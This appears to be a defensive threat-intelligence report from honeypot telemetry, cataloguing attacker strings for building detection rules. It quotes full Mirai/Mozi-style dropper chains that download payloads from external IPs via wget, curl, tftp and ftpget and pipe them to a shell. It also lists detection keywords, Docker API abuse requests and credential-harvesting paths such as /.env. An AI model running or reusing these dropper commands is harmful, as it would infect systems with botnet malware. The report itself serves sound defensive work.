# Malicious Execution Strings & Behavioral TTPs
*Extracted from Active Honeypot Telemetry (Oct 21 - Oct 23, 2026)*

While threat actors frequently rotate IP addresses, their underlying execution logic and command strings often remain static. The following strings, commands, and request signatures were captured during active exploitation and can be used to build high-fidelity SIEM, WAF, or IDS (Snort/Suricata) rules.

## 1. SSH Multi-Binary Dropper Chains (IoT Botnets)
Attackers are utilizing highly resilient, chained execution commands designed to download and execute payloads even if standard system binaries (like `wget` or `curl`) are missing from the target environment.

**Mirai/Mozi Variant Execution Strings:**
*   `rm -f .f; /bin/busybox wget -O .f hxxp://130.12.180[.]212/x86_64 || wget -O .f hxxp://130.12.180[.]212/x86_64 || curl -o .f hxxp://130.12.180[.]212/x86_64 || /bin/busybox tftp -g -l .f -r x86_64 130.12.180.212; /bin/busybox HISILICON`
*   `/bin/busybox wget hxxp://176.65.139[.]40/wget[.]sh -O- | sh;/bin/busybox tftp -g 176.65.139[.]40 -r tftp[.]sh -l- | sh;/bin/busybox ftpget 176.65.139[.]40 ftpget[.]sh ftpget[.]sh && sh ftpget.sh;curl hxxp://176.65.139[.]40/curl[.]sh -o- | sh`
*   `(wget hxxp://185.93.89[.]72/wget -O- || busybox wget hxxp://185.93.89[.]72/wget -O-) > w; chmod 777 w; ./w; rm -rf w`

**Key Defensive Regex/Keyword Targets:**
*   `/bin/busybox wget` chained with `|| curl` or `|| busybox tftp`
*   `/bin/busybox HISILICON` (Targeting specific architecture)
*   Execution piping directly to shell: `-O- | sh` or `-l- | sh`

## 2. PHP2Shell (CVE-2026-109618/109619) Exploit Signatures
The dragnet scanning for the newly leaked PHP vulnerabilities relies on specific malformed HTTP requests designed to trigger memory corruption via PHP's multipart form and upload progress handlers.

**WAF/SIEM Target Strings (HTTP Headers & Body):**
*   `chunked multipart, no Content-Length` (Indicates manipulation of multipart boundaries to trigger memory exhaustion).
*   `upload-progress request` (Indicates exploitation of the secondary CVE-2026-109619 chain).
*   *Behavioral Note:* Rapid sequence of OOM (Out of Memory) or fatal errors in PHP-FPM logs immediately followed by `upload-progress` POST requests from the same source IP.

## 3. Docker API & Container Hijacking
Threat actors scanning for exposed Docker daemon sockets (port 2375) are attempting to rapidly deploy lightweight containers to mine cryptocurrency or pivot into the host network.

**API Abuse Strings:**
*   `container_create image=alpine:latest`
*   *Behavioral Target:* Any unauthenticated POST request to `/containers/create` specifying the `alpine:latest` image.

## 4. Specific Target Paths (Credential Harvesting)
Automated scanners bypassing service exploitation and opting for direct data theft are hardcoding specific file paths into their GET requests.

**Targeted Paths:**
*   `GET /.env` (Attempting to pull hardcoded database credentials, API keys, and app secrets).
*   `GET /Mozi.m` (Existing webshell/botnet check to see if the host is already compromised).